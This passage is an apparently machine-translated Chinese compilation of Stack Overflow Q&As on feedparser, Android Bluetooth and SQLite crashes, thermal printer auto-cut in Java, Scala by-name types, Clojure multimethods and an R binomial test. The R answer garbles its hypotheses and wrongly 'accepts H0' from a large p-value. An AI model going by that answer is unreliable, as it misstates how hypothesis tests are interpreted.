我在上面的代码中收到一个错误，即该属性不存在。我已通过运行确认提要解析器具有命名空间

```
print feed['namespaces'] 
```

这给了我

```
{'': u'http://www.w3.org/2005/Atom', u'gd': u'http://schemas.google.com/g/2005', u'thr': u'http://purl.org/syndication/thread/1.0', u'openSearch': u'http://a9.com/-/spec/opensearchrss/1.0/'} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2022-01-05T08:55:44.163

大写有问题：它应该`opensearch_totalresults`代替`openSearch_totalResults`. 因此，正确的行是：

```
print feed.feed['opensearch_totalresults'] 
```

# android - 安卓平台蓝牙聊天

> ID：11702856
> 
> 赞同：-4
> 
> 时间：2012-07-28T16:45:54.927
> 
> 标签：android, bluetooth

我已经尝试了来自 Android SDK 的蓝牙聊天示例代码。代码没有错误，在设备上安装了APK，打开蓝牙聊天时，抛出强制关闭。

请帮我解决这个问题。提前致谢

感谢您的回复。以下是 logcat 日志。我正在使用 API 级别 8 和 10。提前致谢

```
`at android.app.ActivityThread.access$2300(ActivityThread.java:125)' 
'at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)'
 at android.os.Handler.dispatchMessage(Handler.java:99)'
'at android.os.Looper.loop(Looper.java:123)' 
'at android.app.ActivityThread.main(ActivityThread.java:4627)'
'at java.lang.reflect.Method.invokeNative(Native Method)'
'at java.lang.reflect.Method.invoke(Method.java:521)'
'at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
'at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)'  
'at dalvik.system.NativeStart.main(Native Method)'
 Caused by: java.lang.ClassNotFoundException:  
 com.mca.distance.Bluetooth_Chat.BluetoothChat in loader                          
dalvik.system.PathClassLoader[/data/app/com.mca.distance.Bluetooth_Chat-1.apk] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T19:06:16.967

您是否在手机上或仅在模拟器上尝试过 i？

可能是您的模拟器没有蓝牙功能，因此会崩溃。试一试，让我们知道

# android - 在 android manifest 中实现子包

> ID：11702857
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:45:55.007
> 
> 标签：android, packages

由于我似乎无法在任何地方找到这个，这里有没有人可以告诉我如何做到这一点？我试图在本质上创建一个共享首选项以在我的应用程序中使用我希望将其设置在一个单独的包中，因此我不能自行启动。我正在处理的代码现在已经完成了大约 99% 的调试工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T17:13:03.917

之前我毫无意义的想法背后的原因是，我将此设置作为启动器运行，它将保存我的共享首选项，我们都知道共享首选项在应用程序本身中是全局的，因此作为一个孩子运行它是不值得的包，因为无论如何它在第一个中会很好。

# java - 尝试在热敏打印机（Bixolon SRP350 plus）的 JAVA 应用程序中实现自动切割功能时出现奇怪的行为

> ID：11702859
> 
> 赞同：1
> 
> 时间：2012-07-28T16:46:23.537
> 
> 标签：java, windows-7, thermal-printer, bixolon-printer

我有一个 java 应用程序，可以使用热敏打印机（Bixolon srp 350 plus）打印和自动剪切收据

最初我在自动切割收据时遇到问题，但经过多次试验和谷歌搜索，我设法自动切割收据。但问题是，当我在我的测试机器上部署 war 应用程序时，它打印得很好，但最后并没有剪纸。我什至将war文件部署到我的开发机器的tomcat中，它可以自动切割。

开发机和测试机都使用windows 7-ultimate，同样的apache-tomcat-6.0.18，JDK6/JRE6。

最初测试机器安装了jre6，自动切割后不成功。我安装了我在开发机器中使用的 jdk6，但没有成功。

两台机器不同品牌，硬件配置不同。谁能帮我解决这个问题？这是否与以前安装的 JRE6 和未从 Windows 注册表中正确删除有关？

我正在使用 grails 1.3.7 和 mysql 5.5。

我的代码如下：

```
public void printBill(String printData) throws Exception {
    PrintRequestAttributeSet pras = new HashPrintRequestAttributeSet();    
    pras.add(new Copies(5));    
    pras.add(new PrinterResolution(180,180,PrinterResolution.DPI)); 

    PrintService pss[] = PrintServiceLookup.lookupPrintServices(null,pras);    
    if (pss.length == 0)    {
        throw new RuntimeException("No printer services available."); 
    }

    if(printData == null) {
        throw new Exception("nothing to print");
    }

    PrintService ps = pss[0];    

    DocPrintJob job = ps.createPrintJob();
    DocAttributeSet das = new HashDocAttributeSet();    
    das.add(new PrinterResolution(180,180,PrinterResolution.DPI));

    byte[] desc = printData.getBytes();
    Doc doc = new SimpleDoc(desc, DocFlavor.BYTE_ARRAY.AUTOSENSE, das);    

    try {
        job.print(doc, pras);
        cutPaper();
    } catch (Exception e) {
        e.printStackTrace();
    } 
}

/*
 *  TODO improvision to auto cut bill, need to find a proper way to cut
 */
private  void cutPaper() throws Exception{
    TempPageCutter pageCutter = new RestaurantPrinter().new TempPageCutter();

    pageCutter.cutReceipt();

}

private class TempPageCutter implements Printable {

    @Override
    public int print(Graphics graphics, PageFormat pageFormat, int pageIndex)
            throws PrinterException {
        if(pageIndex > 0)
            return NO_SUCH_PAGE;

        System.out.println("Cutting");
        graphics.drawString("", 0, 0);

        return PAGE_EXISTS;
    }

    public void cutReceipt() throws PrinterException {
        System.out.println("cutReceipt");
        PrintService[]  printService =  PrinterJob.lookupPrintServices();

        if(printService == null || printService.length < 1) {
            return;
        }
        PrinterJob job = PrinterJob.getPrinterJob();
        job.setPrintable(this);
        job.print();
    }

} 
```

如果有人可以帮助我以更好的方式实现自动切割功能，那将是一个很大的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T18:25:16.027

通过在 windows 7 打印机设置页面中将 bixolon srp 350 plus 打印机设置为默认打印机，我能够解决自动切割问题。还是有点奇怪。如果有人可以帮助我更好地实现自动切割功能，那仍然是一个很大的帮助。干杯!

# function - 名称调用参数和函数类型不匹配

> ID：11702863
> 
> 赞同：0
> 
> 时间：2012-07-28T16:47:00.393
> 
> 标签：function, scala, lazy-evaluation, callbyname

在以下场景中，按名称参数会导致与函数发生冲突。

给定一些序列化基础设施：

```
trait Tx {
   def readSource[A](implicit ser: Serializer[A]) : Source[A] = 
      new Source[A] { 
         def get(implicit tx: Tx): A = ser.read(new In {})
      }
}    
trait In
trait Source[A] { def get(implicit tx: Tx): A }
trait Serializer[A] { def read(in: In)(implicit tx: Tx): A } 
```

还有一个示例类型及其序列化程序：

```
// needs recursive access to itself. for reasons
// beyond the scope of this questions, `self` must
// be a by-name parameter
class Transport(self: => Source[Transport])

// again: self is required to be by-name
def transportSer(self: => Source[Transport]) : Serializer[Transport] = 
   new Serializer[Transport] { 
      def read(in: In)(implicit tx: Tx): Transport = new Transport(self)
   } 
```

现在想象一个`Hook`处理递归/相互连接的包装器：

```
trait Hook[A] {
   def source: Source[A]
} 
```

及其序列化器：

```
def hookSer[A](peerSelf: Source[A] => Serializer[A]) : Serializer[Hook[A]] = 
   new Serializer[Hook[A]] {
      def read(in: In)(implicit tx: Tx) : Hook[A] =
         new Hook[A] with Serializer[A] {
            val source: Source[A] = tx.readSource[A](this)
            def read(in: In)(implicit tx: Tx) : A = peerSelf(source).read(in)
         }
   } 
```

然后以下失败：

```
val hs = hookSer[Transport](transportSer)

<console>:15: error: type mismatch;
 found   : => Source[Transport] => Serializer[Transport]
 required: Source[Transport] => Serializer[Transport]
          val hs = hookSer[Transport](transportSer)
                                      ^ 
```

如何在不更改函数的名称参数（尽可能）的情况下解决此问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:49:40.283

似乎可以编写类型`(=> Source[A]) => Serializer[A]`：

```
def hookSer[A](peerSelf: (=> Source[A]) => Serializer[A]) : Serializer[Hook[A]] = ...

val hs = hookSer[Transport](transportSer)
val h  = hs.read(new In {})(new Tx {})
val t  = h.source.get(new Tx {}) 
```

# clojure - 如何在原始类型上调度多方法？

> ID：11702865
> 
> 赞同：8
> 
> 时间：2012-07-28T16:47:20.003
> 
> 标签：clojure, primitive-types, multimethod

我希望我的程序在原始类型及其包装类之间表现不同，例如：

```
(defmulti try-type class)

(defmethod try-type Integer [arg]
  (println "Integer"))

(defmethod try-type Integer/TYPE [arg]
  (println "int")) 
```

但它不起作用，虽然我尝试 Integer 和 int 两者

```
user=> (try-type (.intValue (int 2)))
Integer
nil
user=> (try-type  (int 2))
Integer
nil 
```

那么，是否可以在原始类型上调度多方法？

======编辑======

我正在将 google guava 包装到 clojure 中。其中有一个原始库，例如布尔值、Dobules、Ints 等。它们有一些共同的方法，所以我想尝试多方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T18:38:41.917

不，目前不可能。函数（例如多方法调度函数）的 arg 要么是 Object（因此原语将被装箱）或原语 long/double（因此 Objects 将被拆箱）。您的方案需要一个函数，该函数可以采用其中一个并在函数内部保留该区别。

也就是说，无论您要解决的实际问题是什么，都可能有解决方案。

# android - 从数据库更新或删除时出错；“无法执行方法”

> ID：11702870
> 
> 赞同：1
> 
> 时间：2012-07-28T16:47:52.377
> 
> 标签：android, database, sqlite

解决方案在我帖子的底部。

首先，让我为这篇文章的长度道歉，但我已经把代码倾注了好几个小时，我迷路了。我也对 db 方面感到很困惑，所以我的代码重复了我能找到的一些最简单的教程，即使我知道方面已被弃用或有其他方法可以减少代码长度。我不确定是否需要什么，因此下面有大量代码。

目标：我有一个用户可以填写并保存到数据库表的表单。然后我在另一个类中将这些数据显示到 ListView（这个类在列表视图之上还有其他功能）。通过单击其中一个列表视图项，将打开另一个看起来与原始表单相同的表单，其中所有信息都已从数据库行中填充。此表单有一个保存和删除按钮，可以让您更改某些输入字段（EditText 和 Spinner）并保存以更新行，或选择删除。更新或删除后，活动完成并带您返回列表视图类。

我不会费心添加原始表单数据，因为我知道正确保存。我也知道我的数据正在正确地转换为辅助形式（我可以修改/删除的那个），但是当我尝试更新或删除时，我在我的 logcat 中得到以下信息：

```
07-29 04:18:25.771: E/AndroidRuntime(2116): FATAL EXCEPTION: main
07-29 04:18:25.771: E/AndroidRuntime(2116): java.lang.IllegalStateException: Could not execute method of the activity
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.view.View$1.onClick(View.java:3591)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.view.View.performClick(View.java:4084)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.view.View$PerformClick.run(View.java:16966)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.os.Handler.handleCallback(Handler.java:615)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.os.Handler.dispatchMessage(Handler.java:92)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.os.Looper.loop(Looper.java:137)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.app.ActivityThread.main(ActivityThread.java:4745)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at java.lang.reflect.Method.invokeNative(Native Method)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at java.lang.reflect.Method.invoke(Method.java:511)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at dalvik.system.NativeStart.main(Native Method)
07-29 04:18:25.771: E/AndroidRuntime(2116): Caused by: java.lang.reflect.InvocationTargetException
07-29 04:18:25.771: E/AndroidRuntime(2116):     at java.lang.reflect.Method.invokeNative(Native Method)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at java.lang.reflect.Method.invoke(Method.java:511)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at android.view.View$1.onClick(View.java:3586)
07-29 04:18:25.771: E/AndroidRuntime(2116):     ... 11 more
07-29 04:18:25.771: E/AndroidRuntime(2116): Caused by: java.lang.NullPointerException
07-29 04:18:25.771: E/AndroidRuntime(2116):     at com.rone.glucometer.AddDBHelper.updateDetails(AddDBHelper.java:119)
07-29 04:18:25.771: E/AndroidRuntime(2116):     at com.rone.glucometer.UpdateDBDetails.clickUpdateDelete(UpdateDBDetails.java:420)
07-29 04:18:25.771: E/AndroidRuntime(2116):     ... 14 more 
```

我的 AddDBHelper 类如下所示：

```
public class AddDBHelper {

public static final String KEY_ROWID ="_id";
public static final String KEY_CATEG = "Category";
public static final String KEY_CATEGPOS = "Category_Pos";
public static final String KEY_BGL = "BGL";
public static final String KEY_CARBS = "Carbs";
public static final String DB_NAME = "Glucometer.db";
public static final String DB_TABLE = "Journal";
private static final int DB_VERSION = 1;

private DbHelper myDBHelper;
private final Context mContext;
private SQLiteDatabase glucoDB;

private static class DbHelper extends SQLiteOpenHelper {

    public DbHelper(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE " + DB_TABLE + " (" +
            KEY_ROWID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
            KEY_CATEG + " TEXT NOT NULL, " +
            KEY_CATEGPOS + " TEXT NOT NULL, " +
            KEY_BGL + " TEXT NOT NULL, " +
            KEY_CARBS + " TEXT NOT NULL);"

);}
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + DB_TABLE);
        onCreate(db);
    }

}

public AddDBHelper(Context c) {
    mContext = c;
}

public AddDBHelper open() throws SQLException {
    myDBHelper = new DbHelper(mContext);
    glucoDB = myDBHelper.getWritableDatabase();
    return this;
}

public void close() {
    myDBHelper.close();
}

public long createEntry(String Category, String CategoryPos, String BGL, String Carbs) {
    ContentValues cv = new ContentValues();
    cv.put(KEY_CATEG, Category);
    cv.put(KEY_CATEGPOS, CategoryPos);
    cv.put(KEY_BGL, BGL);
    cv.put(KEY_CARBS, Carbs);
return glucoDB.insert(DB_TABLE, null, cv); }

public Cursor getEntries() {        
    return glucoDB.query(DB_TABLE, new String[] {
            KEY_ROWID,
            KEY_CATEG,
            KEY_CATEGPOS,
            KEY_BGL,
            KEY_CARBS}, null, null, null, null, null); }

public void updateDetails(DBDetails dbdetails) {
    SQLiteDatabase db = myDBHelper.getWritableDatabase();

    ContentValues cv = new ContentValues();
    cv.put(AddDBHelper.KEY_ROWID, UpdateDBDetails.newRow);
    cv.put(AddDBHelper.KEY_CATEG, UpdateDBDetails.newCateg);
    cv.put(AddDBHelper.KEY_CATEGPOS, UpdateDBDetails.newCategPos);
    cv.put(AddDBHelper.KEY_BGL, UpdateDBDetails.newBGL);
    cv.put(AddDBHelper.KEY_CARBS, UpdateDBDetails.newCarbs);

    db.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {String.valueOf(UpdateDBDetails.newRow)});
}

public void deleteDetails(DBDetails dbdetails) {
    SQLiteDatabase db = myDBHelper.getWritableDatabase();
    db.delete(DB_TABLE, KEY_ROWID +"=?", 
            new String[] {String.valueOf(UpdateDBDetails.newRow)});
    db.close();
}} 
```

我的 ListView 活动如下：

```
public class FuncLogbook extends DashMenuActivity implements OnItemClickListener {

private ListView list_LogbookResults;
private ListAdapter list_LogbookAdap;
private ArrayList<DBDetails> LogbookArrayList;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView (R.layout.dash_logbook);

    list_LogbookResults = (ListView) findViewById(R.id.list_logbookResults);
    list_LogbookResults.setOnItemClickListener(this);

    LogbookArrayList = new ArrayList<DBDetails>();
    list_LogbookAdap = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, populateList());
    list_LogbookResults.setAdapter(list_LogbookAdap); }

@SuppressWarnings("deprecation")
public List<String> populateList() {
    List<String> BGLResultsList = new ArrayList<String>();

    AddDBHelper logbook = new AddDBHelper(this);
    logbook.open();
    Cursor cur = logbook.getEntries();
    startManagingCursor(cur);

    while (cur.moveToNext()) {
        String RowID = cur.getString(0);
        String Category = cur.getString(1);
        String CategoryPos = cur.getString(2);
        String BGL = cur.getString(3);
        String Carbs = cur.getString(4);

        DBDetails detailsClass = new DBDetails();
        detailsClass.setuCateg(Category);
        detailsClass.setuCategPos(CategoryPos);
        detailsClass.setuBGL(BGL);
        detailsClass.setuCarbs(Carbs);

        LogbookArrayList.add(detailsClass);
        BGLResultsList.add("BGL: " + BGL + "\nRow ID: " + RowID);
    }

    return BGLResultsList;
}

@Override
protected void onResume() {
    super.onResume();
    LogbookArrayList = new ArrayList<DBDetails>();
    list_LogbookAdap = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, populateList());
    list_LogbookResults.setAdapter(list_LogbookAdap);
}

@Override
protected void onStart() {
    super.onStart();
    LogbookArrayList = new ArrayList<DBDetails>();
    list_LogbookAdap = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, populateList());
    list_LogbookResults.setAdapter(list_LogbookAdap);
}

public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {      
    Intent UpdateDBDetails = new Intent(this, UpdateDBDetails.class);

    DBDetails clickedObject = LogbookArrayList.get(arg2);
    Bundle dataBundle =  new Bundle();
    dataBundle.putString("clickeduCateg", clickedObject.getuCateg());
    dataBundle.putString("clickeduCategPos", clickedObject.getuCategPos());
    dataBundle.putString("clickeduBGL", clickedObject.getuBGL());
    dataBundle.putString("clickeduCarbs", clickedObject.getuCarbs());

    UpdateDBDetails.putExtras(dataBundle);
    startActivity(UpdateDBDetails);
}} 
```

数据被收集到我的 DBDetails 类：

```
public class DBDetails {

private String uCateg;
private String uCategPos;
private String uBGL;
private String uCarbs;

public String getuCateg() {
    return uCateg;
}

public void setuCateg(String uCateg) {
    this.uCateg = uCateg;
}

public String getuCategPos() {
    return uCategPos;
}

public void setuCategPos(String uCategPos) {
    this.uCategPos = uCategPos;
}

public String getuBGL() {
    return uBGL;
}

public void setuBGL(String uBGL) {
    this.uBGL = uBGL;
}

public String getuCarbs() {
    return uCarbs;
}

public void setuCarbs(String uCarbs) {
    this.uCarbs = uCarbs;
} 
```

最后，我显示数据的表单：

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.updatedbdetails);

update_category_spinner = (Spinner) findViewById(R.id.update_category_spinner);
    ArrayAdapter<CharSequence> category_adapter = ArrayAdapter.createFromResource(
            this, R.array.category_array, android.R.layout.simple_spinner_item);

    category_adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    update_category_spinner.setAdapter(category_adapter);

    update_category_spinner.setOnItemSelectedListener(new OnItemSelectedListener() {
        public void onItemSelected(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
            newCat = update_category_spinner.getSelectedItem().toString();
            newCatPos = (update_category_spinner.getSelectedItemPosition() + " Position");
        }

        public void onNothingSelected(AdapterView<?> arg0) {

        }
    });

Bundle takeBundledData = getIntent().getExtras();

    bundleduRowId = takeBundledData.getString("clickeduRowId");
    bundleduCateg = takeBundledData.getString("clickeduCateg");
    bundleduCategPos = takeBundledData.getString("clickeduCategPos");
    bundleduBGL = takeBundledData.getString("clickeduBGL");
    bundleduCarbs = takeBundledData.getString("clickeduCarbs");

CategoryPosition = String.valueOf(bundleduCategPos.charAt(0));
    update_category_spinner.setSelection(Integer.parseInt(CategoryPosition), true);
update_edit_bgl.setText(bundleduBGL);
    update_edit_carbs.setText(bundleduCarbs); }

public static double round(double unrounded, int precision, int roundingMode) {
    BigDecimal bd = new BigDecimal(unrounded);
    BigDecimal rounded = bd.setScale(precision, roundingMode);
    return rounded.doubleValue();
}

public void checkNewBGL() {
    String checkBGL = update_edit_bgl.getText().toString();
    if (checkBGL.matches("")) {
        NewBGLValid = "";
    } else {
        float BGLUnRound = Float.parseFloat(update_edit_bgl.getText().toString());
         double BGLRound= round(BGLUnRound, 1, BigDecimal.ROUND_HALF_UP);
         NewBGLValid = String.valueOf(BGLRound);
    }
    return;
    }

    public void checkNewCarbs() {
    String checkCarbs = update_edit_carbs.getText().toString();
    if (checkCarbs.matches("")) {
        NewCarbsValid = "0";
    } else {        
        NewCarbsValid = update_edit_carbs.getText().toString();
    }
    return;
    }

public void clickUpdateDelete(View v) {

    checkNewBGL();
    checkNewCarbs();

    newCateg = newCat;
    newCategPos = newCatPos;
    newBGL = NewBGLValid;
    newCarbs = NewCarbsValid;

DBDetails dbdetails = new DBDetails();

    dbdetails.setuCateg(newCateg);
    dbdetails.setuCategPos(newCategPos);
    dbdetails.setuBGL(newBGL);
    dbdetails.setuCarbs(newCarbs);

if (v.getId() == R.id.update_button_delete) {
        AddDBHelper deleteEntry = new AddDBHelper(this);
        deleteEntry.deleteDetails(dbdetails);
    } else if (v.getId() == R.id.update_button_save) {
        AddDBHelper updateEntry = new AddDBHelper(this);
        updateEntry.updateDetails(dbdetails);
    }   
}} 
```

我更新到

```
public void updateDetails(DBDetails dbdetails) { 
SQLiteDatabase db = myDBHelper.getWritableDatabase();
ContentValues cv = new ContentValues();
cv.put(AddDBHelper.KEY_CATEG, UpdateDBDetails.newCateg); 
cv.put(AddDBHelper.KEY_CATEGPOS, UpdateDBDetails.newCategPos); 
cv.put(AddDBHelper.KEY_BGL, UpdateDBDetails.newBGL);
cv.put(AddDBHelper.KEY_CARBS, UpdateDBDetails.newCarbs);
db.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {UpdateDBDetails.getRowId});} 
```

并添加到 UpdateDBDetails：

```
getRowId = dbdetails.getuRow(); 
```

虽然同样的问题正在发生。此外，在这个阶段，我没有关闭光标，因为如果我点击“后退”按钮而不是保存或删除，它会由于尝试查询已经关闭的光标而崩溃；我想我稍后会解决这个问题。你是对的，我确实忘记定义 UpdateDBDetails，但是我已经将 DBDetails 上下文传递给了方法，所以我现在改为

```
public void updateDetails(DBDetails dbdetails) {
SQLiteDatabase db = myDBHelper.getWritableDatabase(); 
ContentValues cv = new ContentValues(); 
cv.put(AddDBHelper.KEY_CATEG, dbdetails.getuCateg()); 
cv.put(AddDBHelper.KEY_CATEGPOS, dbdetails.getuCategPos()); 
cv.put(AddDBHelper.KEY_BGL, dbdetails.getuBGL()); 
cv.put(AddDBHelper.KEY_CARBS, dbdetails.getuCarbs()); 
db.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {dbdetails.getuRow()}); } 
```

但同样的问题。

**解决方案：**

我的 DBDetails.java 添加了以下几行：

```
 public String getuRow() {
    return uRow;
}

public void setuRow(String uRow) {
    this.uRow = uRow;
} 
```

我的 Listview (FuncLogbook.Java) 添加\更改了以下行：

```
public List<String> populateList() {
    List<String> BGLResultsList = new ArrayList<String>();

    AddDBHelper logbook = new AddDBHelper(this);
    logbook.open();
    Cursor cur = logbook.getEntries();
    startManagingCursor(cur);

    while (cur.moveToNext()) {
        String RowID = cur.getString(0);
        String Category = cur.getString(3);
        String CategoryPos = cur.getString(4);
        String BGL = cur.getString(5);
        String Carbs = cur.getString(6);

DBDetails detailsClass = new DBDetails();
        detailsClass.setuRow(RowID);
        detailsClass.setuCateg(Category);
        detailsClass.setuCategPos(CategoryPos);
        detailsClass.setuBGL(BGL);
        detailsClass.setuCarbs(Carbs);
LogbookArrayList.add(detailsClass);
}
return BGLResultsList; }

public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {      
    Intent UpdateDBDetails = new Intent(this, UpdateDBDetails.class);

    DBDetails clickedObject = LogbookArrayList.get(arg2);
    Bundle dataBundle =  new Bundle();
    dataBundle.putString("clickeduRowId", clickedObject.getuRow());
    dataBundle.putString("clickeduCateg", clickedObject.getuCateg());
    dataBundle.putString("clickeduCategPos", clickedObject.getuCategPos());
    dataBundle.putString("clickeduBGL", clickedObject.getuBGL());
    dataBundle.putString("clickeduCarbs", clickedObject.getuCarbs());
        UpdateDBDetails.putExtras(dataBundle);
    startActivity(UpdateDBDetails);
} 
```

我的 DB 助手类 (AddDBHelper.java) 显示以下内容：

```
public void updateDetails(DBDetails dbdetails) {

    ContentValues cv = new ContentValues();
    cv.put(AddDBHelper.KEY_CATEG, dbdetails.getuCateg());
    cv.put(AddDBHelper.KEY_CATEGPOS, dbdetails.getuCategPos());
    cv.put(AddDBHelper.KEY_BGL, dbdetails.getuBGL());
    cv.put(AddDBHelper.KEY_CARBS, dbdetails.getuCarbs());
int count = glucoDB.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {String.valueOf(dbdetails.getuRow())});
    Log.v("AddDbHelper", "Row " + dbdetails.getuRow() + " updated? " + count);
}

public void deleteDetails(DBDetails dbdetails) {

    int count = glucoDB.delete(DB_TABLE, KEY_ROWID +"=?", 
            new String[] {String.valueOf(dbdetails.getuRow())});
    Log.v("AddDbHelper", "Row " + dbdetails.getuRow() + " deleted? " + count);
} 
```

最后，我的 UpdateDBDetails.java（包含要修改或删除的信息的表单）显示：

```
onCreate...{
Bundle takeBundledData = getIntent().getExtras();

    bundleduRowId = takeBundledData.getString("clickeduRowId");
    bundleduCateg = takeBundledData.getString("clickeduCateg");
    bundleduCategPos = takeBundledData.getString("clickeduCategPos");
    bundleduBGL = takeBundledData.getString("clickeduBGL");
    bundleduCarbs = takeBundledData.getString("clickeduCarbs");
}

public void clickUpdateDelete(View v) {

    checkNewBGL();
    checkNewCarbs();

    newCateg = newCat;
    newCategPos = newCatPos;
    newBGL = NewBGLValid;
    newCarbs = NewCarbsValid;

AddDBHelper modifyEntry = new AddDBHelper(this);
    modifyEntry.open();

    DBDetails dbdetails = new DBDetails();

    dbdetails.setuRow(bundleduRowId);

    if (v.getId() == R.id.update_button_delete) {
        modifyEntry.deleteDetails(dbdetails);
    } else if (v.getId() == R.id.update_button_save) {
        dbdetails.setuCateg(newCateg);
        dbdetails.setuCategPos(newCategPos);
        dbdetails.setuBGL(newBGL);
        dbdetails.setuCarbs(newCarbs);
modifyEntry.updateDetails(dbdetails);
    }   
    modifyEntry.close();
    finish();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:16:27.033

我没看到你定义的地方`UpdateDBDetails`。但我有一些关于 SQLiteDatabase.update() 的建议。

**首先**将行 ID 添加到您的 UpdateDBDetails 对象并提供一个 get 方法。

**然后**像这样使用更新方法：

```
public void updateDetails() {
    ContentValues cv = new ContentValues();
    cv.put(AddDBHelper.KEY_CATEG, UpdateDBDetails.newCateg);
    cv.put(AddDBHelper.KEY_CATEGPOS, UpdateDBDetails.newCategPos);
    cv.put(AddDBHelper.KEY_BGL, UpdateDBDetails.newBGL);
    cv.put(AddDBHelper.KEY_CARBS, UpdateDBDetails.newCarbs);

    db.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {UpdateDBDetails.getuRow()});
} 
```

当您更新一行时，它的 ID 不应更改，否则您将创建一个新行或更新不同的行...因此 ContentValues 对象不应尝试添加与`AddDBHelper.KEY_ROWID`您的 SQLiteDatabase.update() 的 WHERE 子句有关的任何内容应该有当前行的 ID。希望这是有道理的。

**同样**，无论何时使用`new AddDBHelper`或`myDBHelper.getWritableDatabase()`（或者如果您曾经直接使用过光标），您都应该在完成后关闭这些对象。否则，它们会被保留，不必要地消耗内存。

**从 LogCat 中添加**

我看到了您的 LogCat，我猜是有问题，`UpdateDBDetails`但是我刚刚注意到您在哪里调用 updateDetails() 并建议：

将行 ID 添加到 DBDetails 以便您可以执行以下操作：

```
AddDBHelper helper = new AddDBHelper(this);
helper.open();

DBDetails dbdetails = new DBDetails();
dbdetails.setuRow(bundleduRowId);

if (v.getId() == R.id.update_button_delete) {
    helper.deleteDetails(dbdetails);
} else if (v.getId() == R.id.update_button_save) {
    dbdetails.setuCateg(newCateg);
    dbdetails.setuCategPos(newCategPos);
    dbdetails.setuBGL(newBGL);
    dbdetails.setuCarbs(newCarbs);
    helper.updateDetails(dbdetails);
}   

helper.close(); 
```

最后一个 AddDbHepler：

```
public void updateDetails(DBDetails dbdetails) {
    ContentValues cv = new ContentValues();
    cv.put(AddDBHelper.KEY_CATEG, dbdetails.newCateg);
    cv.put(AddDBHelper.KEY_CATEGPOS, dbdetails.newCategPos);
    cv.put(AddDBHelper.KEY_BGL, dbdetails.newBGL);
    cv.put(AddDBHelper.KEY_CARBS, dbdetails.newCarbs);

    glucoDB.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {String.valueOf(dbdetails.getuRow())});
} 
```

**日志猫**

update 和 delete 都返回一个表示受影响行数的整数，您可以像这样自己查看它们：

```
int count = glucoDB.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {String.valueOf(dbdetails.getuRow())});
Log.v("AddDbHelper", "Row " + dbdetails.getuRow() + " updated? " + count); 
```

如果您看到“...updated? 1”，那么它起作用了，否则存储在 DBDetails 中的 ID 是关闭的。

# r - R中的二项式检验

> ID：11702880
> 
> 赞同：0
> 
> 时间：2012-07-28T16:49:28.697
> 
> 标签：r

我需要在 R 中做一个伯努利测试。所以我知道它实际上是一个类似格式的 binom 测试

```
binom.test(x, n, p = 0.5,
alternative = c("two.sided", "less", "greater"),
conf.level = 0.95) 
```

我的场景有两种可能的结果，即 0 或 1，因此我假设概率为 0.3 或 0.7。我只是不确定如何在 R 中对此进行编码。感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-05-25T19:06:31.267

统计假设检验取决于您对数据的假设。假设您相信 1 出现在数据中的次数超过 0.7 次。所以有两种可能的情况：

H0：数据中 1 的出现次数大于 0.7 H1：数据中 1 的出现次数小于 0.7

因此，您将针对 H1（替代假设）测试 H0（零假设）。在这种情况下，二项式检验是：

```
binom.test(
  table(factor(levels = c(1,0), x=data)),
  p = 0.7,
  alternative =  'less') 
```

输出数据类似于：

```
data:  table(factor(levels = c("true", "false"), x = data))
number of successes = 42587, number of trials = 64000, p-value = 1
alternative hypothesis: true probability of success is less than 0.7
95 percent confidence interval:
  0.000000 0.668492
sample estimates:
  probability of success 
0.6654219 
```

如您所见，p 值大于 0.05，因此接受 H0。

# html - 简单的 Z 索引不起作用

> ID：11702881
> 
> 赞同：1
> 
> 时间：2012-07-28T16:49:34.000
> 
